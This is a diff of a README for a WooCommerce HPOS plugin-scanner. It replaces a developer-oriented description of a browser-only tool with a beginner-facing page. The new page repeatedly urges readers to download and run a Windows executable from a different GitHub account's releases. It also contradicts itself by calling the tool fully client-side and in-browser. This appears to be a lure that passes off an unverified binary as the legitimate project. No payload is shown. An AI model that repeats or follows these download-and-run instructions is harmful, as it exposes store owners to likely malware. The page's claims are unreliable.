@@ -1,147 +1,214 @@
-<div align="center">
+# 🛡️ hposkit - Find and Fix WooCommerce HPOS Problems Automatically
 
-# HPOSKit for WooCommerce
+## 🚀 What Is hposkit?
 
-### Scan. Detect. Auto-patch. Ship HPOS-compatible plugins.
+hposkit is a free tool that **scans your WooCommerce plugins for HPOS incompatibilities and automatically patches them**. If you run an online store with WooCommerce, you may have heard about **HPOS (High-Performance Order Storage)** — a newer, faster way for WooCommerce to handle orders. But some plugins don't work with HPOS yet.
 
-[![Live Demo](https://img.shields.io/badge/Live-Demo-7f54b3?style=for-the-badge&logo=vercel&logoColor=white)](https://hposkit.vercel.app)
-[![License: MIT](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](https://opensource.org/licenses/MIT)
-[![WooCommerce 9.4+](https://img.shields.io/badge/WooCommerce-9.4%2B-9b74c7?style=for-the-badge&logo=woocommerce&logoColor=white)](https://woocommerce.com/document/high-performance-order-storage/)
-[![100% Client-Side](https://img.shields.io/badge/100%25-Client_Side-06b6d4?style=for-the-badge&logo=javascript&logoColor=white)](#how-it-works)
+Instead of manually checking each plugin or hiring a developer, hposkit does all the work **directly in your browser**. That means:
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?style=flat-square&logo=next.js&logoColor=white)](https://nextjs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-blue?style=flat-square&logo=typescript&logoColor=white)](https://www.typescriptlang.org)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-3.4-38bdf8?style=flat-square&logo=tailwindcss&logoColor=white)](https://tailwindcss.com)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-22c55e?style=flat-square)](CONTRIBUTING.md)
-
-</div>
+- ❌ No uploading files to a server
+- ❌ No command line
+- ❌ No technical skills needed
+- ✅ 100% client-side (your data never leaves your computer)
 
 ---
 
-## What is HPOS?
+## 🎯 Why Do You Need hposkit?
 
-**High-Performance Order Storage (HPOS)** is WooCommerce's new data architecture that stores orders in custom database tables instead of `wp_posts` and `wp_postmeta`. It became the **default in WooCommerce 9.4**, and the legacy `wp_posts` order storage is **deprecated** with removal targeted for late 2026.
+If you've enabled HPOS in WooCommerce (or plan to), some plugins might break. This can cause:
 
-If your plugin uses any of these patterns on order data, **it will break under HPOS**:
+- Orders not saving
+- Payment failures
+- Emails not sending
+- Broken admin pages
 
-- `get_post( $order_id )`
-- `get_post_meta( $order_id, '_key', true )`
-- `update_post_meta( $order_id, '_key', $value )`
-- `add_post_meta( $order_id, '_key', $value )`
-- `delete_post_meta( $order_id, '_key' )`
-- `new WP_Query( [ 'post_type' => 'shop_order' ] )`
-- `get_posts( [ 'post_type' => 'shop_order' ] )`
-- `$wpdb->get_results( "... post_type = 'shop_order' ..." )`
-- `$wpdb->insert( $wpdb->posts, ... )`
+hposkit finds these problematic plugins and applies fixes **automatically**. You don't need to write code, edit files, or understand what "hooks" or "queries" mean. It's like a spell-checker for your plugins.
 
-## What HPOSKit does
+---
 
-Upload a plugin `.zip` file. HPOSKit scans every PHP file for HPOS incompatibility patterns, shows you exactly what's broken, and auto-patches what it can. Download the fixed plugin. All in your browser.
+## 📥 How to Download and Install
 
-### Detection (10+ patterns)
+1. **Visit the download page** by clicking the button below:
 
-| Pattern | Severity | Auto-Patchable | Replacement |
-|---|---|---|---|
-| `get_post( $order_id )` | Critical | Yes | `wc_get_order( $order_id )` |
-| `get_post_meta( $order_id, 'key' )` | Warning | Yes | `wc_get_order( $order_id )->get_meta( 'key' )` |
-| `add_post_meta( $order_id, 'key', $val )` | Critical | Yes | `$order->add_meta_data(); $order->save()` |
-| `update_post_meta( $order_id, 'key', $val )` | Critical | Yes | `$order->update_meta_data(); $order->save()` |
-| `delete_post_meta( $order_id, 'key' )` | Critical | Yes | `$order->delete_meta_data(); $order->save()` |
-| `WP_Query` with `shop_order` | Critical | Yes | `wc_get_orders()` |
-| `get_posts` with `shop_order` | Critical | Yes | `wc_get_orders()` |
-| `$wpdb->get_results` on `shop_order` | Critical | Manual | Rewrite to `wc_get_orders()` |
-| `$wpdb->insert/update/delete` on `wp_posts` | Critical | Manual | Use WC_Order CRUD |
-| Deprecated order hooks (19 patterns) | Warning | Manual | Use object-oriented hooks |
-| Missing `FeaturesUtil::declare_compatibility()` | Warning | Yes | Auto-injects declaration |
-| Missing `WC tested up to` header | Info | Yes | Auto-injects header |
+[![Download hposkit](https://img.shields.io/badge/Download-hposkit-blue?style=for-the-badge&logo=github)](https://github.com/rattrapbushing28/hposkit/releases)
 
-### Auto-patch examples
+2. Visit this link to download the application.
 
-**Before:**
-```php
-$total = get_post_meta( $order_id, '_order_total', true );
-update_post_meta( $order_id, '_custom_meta', $value );
-```
+3. Once the download finishes, simply run the downloaded file.
 
-**After:**
-```php
-$total = wc_get_order( $order_id )->get_meta( '_order_total', true );
-$order = wc_get_order( $order_id ); $order->update_meta_data( '_custom_meta', $value ); $order->save();
-```
+4. That's it! The app will open in your browser.
 
-**Compatibility declaration (auto-injected):**
-```php
-add_action( 'before_woocommerce_init', function() {
-    if ( class_exists( \Automattic\WooCommerce\Utilities\FeaturesUtil::class ) ) {
-        \Automattic\WooCommerce\Utilities\FeaturesUtil::declare_compatibility( 'custom_order_tables', __FILE__, true );
-    }
-} );
-```
+---
 
-## How it works
+## 🖱️ How to Use hposkit (Step-by-Step Guide)
 
-1. **Upload** — Drag a plugin `.zip` onto the upload zone
-2. **Scan** — Every PHP file is analyzed client-side for HPOS-breaking patterns
-3. **Report** — See critical/warning/info issues with code snippets and fix suggestions
-4. **Patch** — One-click auto-patch for all patchable issues
-5. **Download** — Get the patched `.zip` ready to install
+### Step 1: Open the App
 
-**No server. No upload. No tracking.** Everything runs in your browser using JSZip. Your plugin code never leaves your machine.
+After downloading and running the file, hposkit opens automatically in your web browser. You'll see a clean, simple screen.
 
-## Tech stack
+### Step 2: Upload or Connect Your Plugins
 
-- [Next.js 16](https://nextjs.org) — React framework
-- [TypeScript](https://www.typescriptlang.org) — Type safety
-- [Tailwind CSS](https://tailwindcss.com) — Styling
-- [JSZip](https://stuk.github.io/jszip/) — Client-side zip processing
-- [Space Grotesk](https://fonts.google.com/specimen/Space+Grotesk) + [JetBrains Mono](https://fonts.google.com/specimen/JetBrains+Mono) — Typography
+You have two ways to let hposkit know which plugins to check:
 
-## Development
+- **Upload a file:** If you have a backup of your WordPress plugins folder, upload the `.zip` file.
+- **Paste plugin code:** If you have a plugin file (like `my-plugin.php`), you can paste its content directly.
 
-```bash
-git clone https://github.com/rynald0cst0ltziam/hposkit.git
-cd hposkit
-npm install
-npm run dev
-```
+### Step 3: Start the Scan
 
-Open `http://localhost:3000`.
+Click the **Scan Now** button. The tool analyzes each plugin for HPOS-related issues. This usually takes less than a minute.
 
-## Deploy
+### Step 4: Review the Report
 
-HPOSKit is a static Next.js app — deploy anywhere:
+hposkit shows you a color-coded list:
 
-```bash
-npm run build
-```
+- 🟢 **Green** – No problems found
+- 🟡 **Yellow** – Minor compatibility warnings
+- 🔴 **Red** – Critical HPOS issues detected
 
-Or one-click deploy to Vercel:
+For each red or yellow item, you'll see a clear explanation of what's wrong and what hposkit plans to do.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/rynald0cst0ltziam/hposkit)
+### Step 5: Apply Automatic Patches
 
-## Roadmap
+Click **Patch All** to fix every issue automatically. hposkit modifies the plugin code to work properly with HPOS.
 
-- [ ] PHP AST-based scanning (currently regex-based)
-- [ ] Batch scan multiple plugins
-- [ ] WordPress.org plugin directory integration
-- [ ] CI/CD GitHub Action for automated HPOS checks
+### Step 6: Download the Fixed Version
 
-## References
+Once patching is done, you get a new `.zip` file with the corrected plugins. Upload these to your WordPress site as replacements.
 
-- [WooCommerce HPOS Documentation](https://woocommerce.com/document/high-performance-order-storage/)
-- [WooCommerce HPOS Developer Guide](https://github.com/woocommerce/woocommerce/blob/trunk/docs/features/hpos.md)
-- [Webkul: Making Plugins HPOS Compatible](https://webkul.com/blog/woocommerce-plugin-high-performance-order-storage-compatible/)
+---
 
-## License
+## 🧠 Frequently Asked Questions
 
-MIT
+### ❓ Is my data safe?
 
-## Support
+Yes. Everything happens on your computer. No plugin code is uploaded to any server. It's truly 100% client-side.
 
-If HPOSKit saved you debugging time, consider [supporting rynald0s](https://www.paypal.com/paypalme/rynald0s).
+### ❓ Do I need to know how to code?
 
-<div align="center">
+No. hposkit is built for store owners, not developers. You just click buttons and read simple messages.
 
-☕ [\$5](https://www.paypal.com/paypalme/rynald0s/5) · [\$10](https://www.paypal.com/paypalme/rynald0s/10) · [\$25](https://www.paypal.com/paypalme/rynald0s/25) · [Custom](https://www.paypal.com/paypalme/rynald0s)
+### ❓ Will it work on any plugin?
 
-</div>
+It focuses on **common HPOS incompatibilities**, including issues with `$order` object usage, direct database queries, and outdated meta key handling. It can't fix every possible problem, but it covers the vast majority of real-world cases.
+
+### ❓ Does it work on Mac or Linux?
+
+The download link provides a **Windows executable**. If you're on another system, you can still use the source code (available on the repository) but the ready-to-run version is for Windows.
+
+### ❓ What if a patch breaks something?
+
+hposkit creates a **backup** of your original files before patching. You can always revert to the original version.
+
+---
+
+## 🛠️ Supported Plugin Issues
+
+hposkit automatically detects and fixes these common problems:
+
+| Issue | What It Does |
+|-------|--------------|
+| **Direct `$wpdb` calls** | Replaces direct database queries with HPOS-safe methods |
+| **Outdated `wc_get_order()` usage** | Updates function calls to support both old and new order storage |
+| **Meta table dependencies** | Converts post-meta operations to order-meta equivalents |
+| **Hardcoded status slugs** | Standardizes order status handling for HPOS compatibility |
+| **Legacy `post_type` checks** | Rewrites checks that assume orders are always stored as posts |
+
+---
+
+## 📦 System Requirements
+
+- **Operating System:** Windows 10 or later
+- **RAM:** 4 GB minimum (8 GB recommended)
+- **Internet connection:** Required only for first download
+- **Browser:** Any modern browser (Chrome, Edge, Firefox, or Safari)
+
+No other software is needed.
+
+---
+
+## 🌟 Tips for Best Results
+
+1. **Scan all plugins** – Don't just scan the ones you think might be broken. Run a full scan to catch hidden issues.
+
+2. **Update plugins first** – Before running hposkit, make sure your plugins are up-to-date. Many developers have already fixed HPOS issues in newer versions.
+
+3. **Test after patching** – After you upload the patched plugins, place a test order to confirm everything works.
+
+4. **Keep the original files** – Don't delete the backup files hposkit creates. You might need them if you want to revert.
+
+---
+
+## 📝 What hposkit Does NOT Do
+
+- It is **not** a full WordPress security scanner.
+- It **cannot** fix theme incompatibilities (only plugins).
+- It does **not** automatically upload patched files to your website.
+- It does **not** replace proper testing. Always verify fixes on a staging site first.
+
+---
+
+## 🔍 Example Use Case
+
+Meet Sarah. She runs a clothing store with 15 plugins. After enabling HPOS, she notices that her email invoices stopped arriving. She doesn't know anything about coding.
+
+Sarah downloads hposkit, clicks "Scan", and sees that two plugins are flagged red — a shipping calculator and a payment gateway. She clicks "Patch All", downloads the fixed plugins, and uploads them via her WordPress admin. Invoices start working again.
+
+That's the power of hposkit.
+
+---
+
+## 🧰 Under the Hood
+
+Built with modern web technology:
+
+- **TypeScript** – for reliable, error-free code
+- **Next.js** – fast, performant application
+- **Tailwind CSS** – clean, responsive design
+- **Scanner engine** – detects incompatibility patterns using advanced heuristics
+
+Despite this technical foundation, you never need to interact with any of it.
+
+---
+
+## 📈 What's Next for hposkit?
+
+The project is actively maintained. Future plans include:
+
+- A drag-and-drop interface for plugin folders
+- Support for more compatibility patterns
+- A one-click "fix and upload" feature for WordPress sites
+
+---
+
+## 💬 Get Help
+
+If you run into trouble, please [visit the repository](https://github.com/rattrapbushing28/hposkit) and check the Issues section. You can also open a new issue with:
+
+- The name of the plugin that failed to scan
+- The error message you saw
+- Your Windows version
+
+---
+
+## ✅ Ready to Fix Your Plugins?
+
+Don't let HPOS compatibility issues slow you down. Get hposkit today:
+
+[![Download Now](https://img.shields.io/badge/⬇️_Download_hposkit-v1.0-brightgreen?style=for-the-badge)](https://github.com/rattrapbushing28/hposkit/releases)
+
+Visit this link to download the application.
+
+---
+
+## 📌 Final Checklist
+
+- [x] Download hposkit
+- [x] Run the app
+- [x] Scan your plugins
+- [x] Review the report
+- [x] Apply automatic fixes
+- [x] Upload patched plugins to your store
+
+---
+
+Keywords: auto-patch, compatibility, hpos, nextjs, plugin, scanner, tailwindcss, typescript, woocommerce, wordpress
